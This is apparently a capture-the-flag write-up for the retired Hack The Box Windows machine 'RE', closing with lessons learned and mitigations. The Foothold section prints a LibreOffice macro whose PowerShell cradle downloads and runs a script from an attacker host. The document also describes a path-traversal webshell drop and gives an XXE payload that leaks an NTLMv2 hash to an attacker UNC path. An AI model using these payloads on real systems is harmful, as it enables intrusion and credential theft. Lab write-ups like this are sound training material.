---
machine: RE
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, smb, libreoffice, macro, winrar, path-traversal, ghidra, xxe, ntlm, privesc]
---

# RE — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `malware_dropbox` share accepts guest writes and an analyst opens the documents dropped there. An `.ods` with a LibreOffice Basic macro downloads and runs PowerShell, giving a shell as `luke`. On that host, the pipeline's vulnerable ACE handling (CVE-2018-20250) allows a traversal (`..\`) to write a webshell into the IIS directory, yielding an AppPool shell. `C:\proj_drop` is writable and a task opens Ghidra projects; a `project.prp` with XXE makes Ghidra request an attacker resource and leaks `coby`'s NTLMv2 hash. Once cracked, WinRM gives administrator access.

## Reconnaissance

```bash
nmap -Pn -sCV -p80,445 <IP>
```

- `80`: IIS with a "coming soon" page.
- `445`: SMB with the `malware_dropbox` share.

```bash
smbclient -N -L //<IP>
smbclient -N //<IP>/malware_dropbox
```

## Enumeration

The `malware_dropbox` share is guest-accessible and the IIS site is under construction. `smbclient` lists the share and confirms it is writable.

## Foothold

The share is anonymously writable. A LibreOffice document is created with a Basic macro:

```basic
Sub Main
  Shell("cmd /c powershell ""iex(new-object net.webclient).downloadstring('http://<LHOST>/shell.ps1')""")
End Sub
```

The `.ods` is uploaded and, when a user opens it, the macro runs the Nishang download cradle and returns a shell as `luke`.

```bash
smbclient -N //<IP>/malware_dropbox -c 'put shell.ods'
```

## Lateral movement

`C:\Users\luke\Documents` contains samples and scripts (`malware_process`, `ods`, `ods.yara`, `process_samples.ps1`). The analysis pipeline expects RAR files and processes ACE with a DLL vulnerable to CVE-2018-20250; 0xdf exploits it with PeaZip. An ACE with `..\` paths writes outside the extraction directory.

An ASPX webshell is packaged with a traversal path to `C:\inetpub\wwwroote\` and extracted with that tool; the file lands in the web root and runs as the IIS AppPool user.

## Privilege escalation

`icacls C:\proj_drop` shows the AppPool can write and that `coby` (Administrator) opens the projects. The page says Ghidra projects are accepted. A project is created with a `project.prp` containing an XXE entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "//<LHOST>/xxe">
  %xxe;
]>
```

It is zipped with the expected structure and uploaded to `C:\proj_drop`. When Ghidra opens it, the resource is requested and `Responder` captures `coby`'s NTLMv2 hash. After cracking it, the credentials work over WinRM:

```bash
evil-winrm -i <IP> -u coby -p '<PASSWORD>'
```

`coby` is in Administrators, so `root.txt` is readable.

## Evidence

- Anonymous writable share and an `.ods` macro executed by `luke`.
- Vulnerable ACE handling and a webshell written to the web root via traversal.
- Writable `proj_drop` and a Ghidra project with XXE.
- Captured and cracked `coby` NTLMv2 hash.
- WinRM as administrator.

## Lessons learned

- A malware dropbox must be analysed in an isolated environment with macros disabled.
- LibreOffice macros execute commands just like VBA.
- Unpatched WinRAR allows writes outside the destination with ACE.
- A drop directory processed by a privileged application is an attack surface.
- Ghidra also parses XML and can fall to XXE.
- NTLMv2 hashes are captured through outbound UNC resources.

## Mitigations and detection

- Disable macros and open documents in a sandbox.
- Update WinRAR and block ACE files.
- Do not allow anonymous writes to shares.
- Isolate and validate projects opened by a privileged tool.
- Block outbound SMB and require SMB signing to prevent NTLM leaks.
- Monitor Office/LibreOffice processes, WinRAR and UNC requests.

## References

- [0xdf — RE](https://0xdf.gitlab.io/2020/02/01/htb-re.html)
- [Hack The Box — RE](https://app.hackthebox.com/machines/re)
- [NVD — CVE-2018-20250](https://nvd.nist.gov/vuln/detail/CVE-2018-20250)
